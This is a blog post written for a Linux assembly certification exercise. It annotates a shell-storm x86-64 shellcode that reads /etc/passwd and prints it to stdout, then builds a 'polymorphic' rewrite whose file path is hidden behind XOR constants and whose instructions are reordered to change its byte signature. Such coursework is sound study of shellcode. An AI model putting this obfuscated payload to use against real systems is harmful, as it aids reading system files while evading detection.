Title: SLAE64 - Assignment 6.1
Date: 2022-07-01T19:45:25.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="foreword">Foreword</h2><p>I chose the following shellcode samples:</p><ol><li><a href="https://shell-storm.org/shellcode/files/shellcode-878.php">Read /etc/passwd - 82 bytes</a></li><li><a href="https://shell-storm.org/shellcode/files/shellcode-896.php">Add map in /etc/hosts file - 110 bytes</a></li><li><a href="https://shell-storm.org/shellcode/files/shellcode-867.php">Reads data from /etc/passwd to /tmp/outfile - 118 bytes</a></li></ol><p>In this part I'll create a polymorphic version of the first shellcode.</p><h2 id="source-code">Source Code</h2><p>The files for this part of the assignment are the following:</p><ul><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/1/original.nasm">original.asm</a>, which contains the original shellcode</li><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/1/polymorphic.nasm">polymorphic.nasm</a>, containing the polymorphic version of the shellcode</li></ul><h2 id="analysis">Analysis</h2><p>As mentioned previously, the first shellcode consists of reading the file <code>/etc/passwd</code>. At 82 bytes, it is a simple shellcode, around the length of a simple reverse shell.</p><p>Below is a snippet of code containing the assembly instructions along with some comments describing the logic in broad terms.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">; JMP-CALL-POP technique to retrieve the address of
; "/etc/passwd", stored into RDI
; 1st argument of open: pointer to the file to open
0x00000000      eb3f           jmp 0x41
0x00000002      5f             pop rdi

; XOR the byte 0x41 following the string "/etc/passwd"
; this way it turns it into a string terminator (NULL byte)
0x00000003      80770b41       xor byte [rdi + 0xb], 0x41

; syscall open
0x00000007      4831c0         xor rax, rax
0x0000000a      0402           add al, 2

; 2nd argument of read: O_RDONLY (open file in read mode)
0x0000000c      4831f6         xor rsi, rsi

; call syscall open
0x0000000f      0f05           syscall

; create a buffer of 0xfff bytes on the stack
0x00000011      6681ecff0f     sub sp, 0xfff

; 2nd argument of read: pointer to the memory location
; where to store the bytes read
0x00000016      488d3424       lea rsi, [rsp]

; 1st argument of read: file descriptor from which to read
; the bytes
0x0000001a      4889c7         mov rdi, rax

; 3rd argument of read: number of bytes to read
0x0000001d      4831d2         xor rdx, rdx
0x00000020      66baff0f       mov dx, 0xfff

; call syscall read
0x00000024      4831c0         xor rax, rax
0x00000027      0f05           syscall

; 1st argument of write: file descriptor where to write
; the bytes
0x00000029      4831ff         xor rdi, rdi
0x0000002c      4080c701       add dil, 1

; 3rd argument of write: number of bytes to write
0x00000030      4889c2         mov rdx, rax

; call syscall write
0x00000033      4831c0         xor rax, rax
0x00000036      0401           add al, 1
0x00000038      0f05           syscall

; call exit syscall
0x0000003a      4831c0         xor rax, rax
0x0000003d      043c           add al, 0x3c
0x0000003f      0f05           syscall

0x00000041      e8bcffffff     call 2

; string "/etc/passwd" followed by the byte 0x41
0x00000046      2f             invalid
0x00000047      657463         je 0xad
0x0000004a      2f             invalid
0x0000004b      7061           jo 0xae
0x0000004d      7373           jae 0xc2
0x0000004f      7764           ja 0xb5
0x00000051      41             invalid</code></pre><figcaption>First analysis of the shellcode</figcaption></figure><p>Overall, the shellcode can be divided in these steps:</p><ol><li>using the <code>JMP-CALL-POP</code> technique to obtain the address of the string <code>/etc/passwd</code></li><li>invoking the syscall <code>open</code> to open the previous file in read mode</li><li>invoking the syscall <code>read</code> to read 4095 bytes, and saving them on the stack</li><li>invoking the syscall <code>write</code> to write them to the <em>standard output</em></li><li>invoking the syscall <code>exit</code> to terminate the execution of the shellcode</li></ol><h2 id="polymorphism">Polymorphism</h2><p>For simplicity I chose to divide the shellcode into the following assembly routines:</p><ul><li><em>OpenFile</em></li><li><em>ReadFile</em></li><li><em>WriteOutput</em></li><li><em>Exit</em></li></ul><h3 id="openfile">OpenFile</h3><p>The first routine simply opens the file <code>/etc/passwd</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">global _start

section .text

_start:

OpenFile:

    xor eax, eax
    push rax

    push 0x64777373

    mov rbx, 0xcdbdc152350e17cb
    mov rcx, 0xaccdee31416b38e4
    xor rbx, rcx

    push rbx

    mov rdi, rsp
  
    add al, 2

    xor esi, esi
    syscall</code></pre><figcaption>Opening <code>/etc/passwd</code></figcaption></figure><p>Instead of the <code>JMP-CALL-POP</code> technique, I decided to push the string to the stack and retrieve its address through the <code>RSP</code> register.</p><p>This allowed me to decrease the number of bytes used by the shellcode, making it smaller.</p><p>Moreover, thanks to the decrement in size, I could use some of the spare bytes to obfuscate part of the strings, e.g. <code>/etc/passwd</code>.</p><p>In this case, the only clear-text part is the substring <code>sswd</code>. If you can afford some other bytes, you could probably obfuscate that one too.</p><h3 id="readfile">ReadFile</h3><p>Since the routing for reading the bytes from <code>/etc/passwd</code> is quite short, I simply changed some of the instructions (to alter the resulting bytes) and their order.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">ReadFile:

    sub sp, 0xfff
    mov rsi, rsp

    push rax
    pop rdi

    xor eax, eax

    cdq
    mov dx, 0xfff

    syscall</code></pre><figcaption>Reading <code>/etc/passwd</code></figcaption></figure><p>In this case, I replaced the <code>LEA</code> (Load Effective Address) instruction with <code>MOV</code>, and replaced the next <code>MOV</code> with the <code>PUSH-POP</code> technique, which should occupy fewer bytes depending on the register used.</p><p>There's also the instruction <code>CDQ</code> (Convert Double to Quad), which allows me sign-extend <code>RAX</code> into <code>RDX</code>, thus clearing the latter if the former is positive.</p><h3 id="writeoutput">WriteOutput</h3><p>In the original shellcode, the part of the code responsible for writing the contents of <code>/etc/passwd</code> to the standard output can be shrinked to its half.</p><p>In fact, it clears the <code>RDI</code> register and increases it by 1, while doing the same operations for the <code>RAX</code> register, when you could simply copy <code>RDI</code> into <code>RAX</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">WriteOutput:
  
    ; call sys_write
    xor edi, edi
    inc edi
    mov rax, rdi

    syscall</code></pre><figcaption>Writing the contents of <code>/etc/passwd</code> to <code>stdout</code></figcaption></figure><h3 id="exit">Exit</h3><p>The last routine terminates the execution of the shellcode, exiting gracefully.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">Exit:

    ; call sys_exit
    push rdi
    pop rax
    add al, 59
    syscall</code></pre><figcaption>Graceful exit</figcaption></figure><p>If you wanted to make the shellcode even smaller, you could remove this part, since it's not really necessary.</p>